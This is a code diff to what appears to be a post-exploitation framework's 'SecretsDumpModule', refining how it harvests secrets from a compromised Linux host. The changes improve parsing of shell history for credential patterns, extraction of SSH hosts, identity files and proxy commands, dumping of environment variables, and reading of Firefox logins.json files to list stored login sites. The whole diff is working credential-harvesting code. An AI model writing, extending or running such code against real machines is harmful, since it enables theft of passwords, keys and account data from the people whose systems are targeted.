@@ -45,12 +45,13 @@ _SENSITIVE_VALUE_RE = re.compile(
 
 
 def parse_shell_history(content: str) -> List[str]:
-    """Parse shell history and extract commands with credential patterns."""
     commands = []
     for line in content.split('\n'):
         line = line.strip()
         if not line or line.startswith('#'):
             continue
+        if line.startswith(': ') and ';' in line:
+            line = line.split(';', 1)[1]
         line = re.sub(r'\s+', ' ', line)
         if CRED_PATTERNS.search(line):
             if len(line) > 120:
@@ -93,22 +94,28 @@ def parse_git_config(content: str) -> Dict[str, str]:
 
 
 def parse_ssh_config(content: str) -> Dict[str, Dict[str, str]]:
-    """Parse SSH config and extract interesting hosts."""
     result = {}
     current_host = None
     for line in content.split('\n'):
         line = line.strip()
+        if not line or line.startswith('#'):
+            continue
         if line.lower().startswith('host '):
             current_host = line.split(None, 1)[1] if ' ' in line else None
-        elif current_host and line and not line.startswith('#'):
+        elif current_host:
             if '=' in line:
                 key, val = line.split('=', 1)
-                key = key.strip().lower()
-                val = val.strip()
-                if key in ['user', 'port', 'identityfile', 'hostname', 'proxycommand']:
-                    if current_host not in result:
-                        result[current_host] = {}
-                    result[current_host][key] = val
+            else:
+                parts = line.split(None, 1)
+                if len(parts) != 2:
+                    continue
+                key, val = parts
+            key = key.strip().lower()
+            val = val.strip()
+            if key in ('user', 'port', 'identityfile', 'hostname', 'proxycommand'):
+                if current_host not in result:
+                    result[current_host] = {}
+                result[current_host][key] = val
     return result
 
 
@@ -312,7 +319,7 @@ class SecretsDumpModule(KoiModule):
 
     def _hunt_env_vars(self) -> dict:
         result = {}
-        raw = self._try_exec("declare -x")
+        raw = self._try_exec("declare -x 2>/dev/null || env")
         if not raw:
             return result
         env: Dict[str, str] = {}
@@ -522,21 +529,27 @@ class SecretsDumpModule(KoiModule):
                 result["Firefox Encrypted Keys"] = f"{len(firefox_key_files)} database(s)"
 
         # Firefox - extract hostnames from logins.json
-        logins_content = self._try_exec(
-            "find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null | xargs -r cat 2>/dev/null"
+        logins_paths = self._try_exec(
+            "find ~/.mozilla/firefox -type f -name 'logins.json' 2>/dev/null"
         )
-        if logins_content:
+        if logins_paths:
             hosts = set()
-            try:
-                data = json.loads(logins_content)
-                if isinstance(data, dict) and 'logins' in data:
-                    for login in data.get('logins', []):
-                        host = login.get('hostname', '')
-                        if host and not host.startswith('chrome://'):
-                            hosts.add(host)
-            except (json.JSONDecodeError, ValueError):
-                pass
-
+            for lpath in logins_paths.strip().split('\n'):
+                lpath = lpath.strip()
+                if not lpath:
+                    continue
+                raw = self._try_exec(f"cat {self._shell_quote(lpath)} 2>/dev/null")
+                if not raw:
+                    continue
+                try:
+                    data = json.loads(raw)
+                    if isinstance(data, dict):
+                        for login in data.get('logins', []):
+                            host = login.get('hostname', '')
+                            if host and not host.startswith('chrome://'):
+                                hosts.add(host)
+                except (json.JSONDecodeError, ValueError):
+                    pass
             if hosts:
                 result["Firefox Stored Hosts"] = ", ".join(sorted(list(hosts))[:15])
 
